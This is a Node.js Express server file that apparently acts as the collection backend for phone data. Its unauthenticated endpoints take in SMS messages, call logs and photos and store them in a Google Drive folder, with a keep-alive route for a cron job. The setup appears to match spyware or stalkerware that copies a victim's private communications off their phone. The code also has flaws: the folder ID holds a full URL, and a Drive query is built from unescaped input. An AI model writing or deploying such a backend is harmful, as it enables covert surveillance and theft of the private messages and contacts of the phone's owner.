const express = require('express');
const { google } = require('googleapis');
const app = express();

app.use(express.json());

// Google Drive setup
const drive = google.drive({
  version: 'v3',
  auth: new google.auth.GoogleAuth({
    keyFile: './credentials.json',
    scopes: ['https://www.googleapis.com/auth/drive.file'],
  }),
});

// Replace with your CloudSyncData folder ID
const FOLDER_ID = 'https://drive.google.com/drive/folders/1pCI9jJ0L80cejvs-HS8Cwz5pMgeMUebC';

// Helper function to find or create a file in Google Drive
async function findOrCreateFile(fileName) {
  try {
    // Search for the file in the folder
    const response = await drive.files.list({
      q: `name='${fileName}' and '${FOLDER_ID}' in parents and trashed=false`,
      fields: 'files(id, name)',
    });

    const files = response.data.files;
    if (files.length > 0) {
      return files[0].id; // Return the existing file ID
    }

    // If the file doesn't exist, create it
    const fileMetadata = {
      name: fileName,
      mimeType: 'text/plain',
      parents: [FOLDER_ID],
    };
    const file = await drive.files.create({
      resource: fileMetadata,
      fields: 'id',
    });
    return file.data.id;
  } catch (error) {
    console.error(`Error finding/creating file ${fileName}:`, error.message);
    throw error;
  }
}

// Helper function to append data to a file in Google Drive
async function appendToFile(fileId, data) {
  try {
    // Get the current content of the file
    let currentContent = '';
    try {
      const response = await drive.files.get({
        fileId: fileId,
        alt: 'media',
      });
      currentContent = response.data || '';
    } catch (error) {
      if (error.response && error.response.status === 404) {
        // File is empty or doesn't exist (newly created)
        currentContent = '';
      } else {
        throw error;
      }
    }

    // Append the new data
    const updatedContent = currentContent + data + '\n';

    // Update the file with the new content
    await drive.files.update({
      fileId: fileId,
      media: {
        mimeType: 'text/plain',
        body: updatedContent,
      },
    });
  } catch (error) {
    console.error(`Error appending to file ${fileId}:`, error.message);
    throw error;
  }
}

// Photo upload endpoint (unchanged)
app.post('/upload/photo', async (req, res) => {
  try {
    const { fileName, fileContent } = req.body; // Simplified for example
    const fileMetadata = {
      name: fileName,
      parents: [FOLDER_ID],
    };
    const media = {
      mimeType: 'image/jpeg',
      body: Buffer.from(fileContent, 'base64'),
    };
    const response = await drive.files.create({
      resource: fileMetadata,
      media: media,
      fields: 'id',
    });
    console.log(`Photo uploaded: ${fileName}, ID: ${response.data.id}`);
    res.status(200).send('Photo uploaded');
  } catch (error) {
    console.error('Error uploading photo:', error.message);
    res.status(500).send('Error uploading photo');
  }
});

// SMS endpoint
app.post('/upload/sms', async (req, res) => {
  try {
    const { sender, message, timestamp } = req.body;
    const logEntry = `SMS: ${sender}, ${message}, ${timestamp}`;
    console.log(logEntry);

    // Find or create the SMS log file
    const fileId = await findOrCreateFile('sms_logs.txt');
    // Append the SMS data to the file
    await appendToFile(fileId, logEntry);

    res.status(200).send('SMS received and stored');
  } catch (error) {
    console.error('Error storing SMS:', error.message);
    res.status(500).send('Error storing SMS');
  }
});

// Call logs endpoint
app.post('/upload/call_logs', async (req, res) => {
  try {
    const { callLogs } = req.body;
    const logEntry = `Call Logs: ${JSON.stringify(callLogs)}`;
    console.log(logEntry);

    // Find or create the call logs file
    const fileId = await findOrCreateFile('call_logs.txt');
    // Append the call logs data to the file
    await appendToFile(fileId, logEntry);

    res.status(200).send('Call logs received and stored');
  } catch (error) {
    console.error('Error storing call logs:', error.message);
    res.status(500).send('Error storing call logs');
  }
});

// Health check endpoint
app.post('/upload/health_check', async (req, res) => {
  try {
    const { message } = req.body;
    const logEntry = `Health Check: ${message}`;
    console.log(logEntry);

    // Find or create the health checks file
    const fileId = await findOrCreateFile('health_checks.txt');
    // Append the health check data to the file
    await appendToFile(fileId, logEntry);

    res.status(200).send('Health check received and stored');
  } catch (error) {
    console.error('Error storing health check:', error.message);
    res.status(500).send('Error storing health check');
  }
});

// Keep-alive endpoint for cron job
app.get('/upload/health_check', (req, res) => {
  console.log('Health check ping received');
  res.status(200).send('OK');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});